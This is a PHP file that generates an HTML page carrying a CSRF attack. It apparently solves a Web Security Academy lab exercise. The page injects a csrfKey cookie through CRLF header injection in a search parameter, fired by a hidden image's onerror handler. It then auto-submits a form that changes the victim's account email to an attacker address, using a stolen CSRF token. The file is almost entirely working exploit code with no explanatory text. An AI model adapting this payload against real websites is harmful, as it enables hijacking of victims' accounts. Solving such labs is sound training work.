<?php
// Attacker's stolen CSRF token and csrfKey cookie
$csrf_token = 'qOMrhp4QDRufNQBW6aFE7WHOJHSsLmAw';
$csrf_key   = 'hQxC1tX8xM20u7QwVfsqYP1vce9rpagz';

// Target domain
$target = 'https://0abb00b70389d0dd808c0370003700a3.web-security-academy.net';

// Reflected input to inject csrfKey cookie
$inject_cookie = $target . '/?search=test%0d%0aSet-Cookie:%20csrfKey=' . urlencode($csrf_key) . ';%20SameSite=None';

echo '<html>
  <body>
    <!-- Step 1: Inject csrfKey cookie via reflected header -->
    <img src="' . $inject_cookie . '" style="display:none" onerror="document.forms[0].submit()" />

    <!-- Step 2: Auto-submitting CSRF form with attacker\'s token -->
    <form method="POST" action="' . $target . '/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil.kav" />
      <input type="hidden" name="csrf" value="' . htmlspecialchars($csrf_token) . '" />
    </form>

    <script>
      // Wait briefly to ensure cookie injection completes
      setTimeout(() => {
        document.forms[0].submit();
      }, 500);
    </script>
  </body>
</html>';
?>
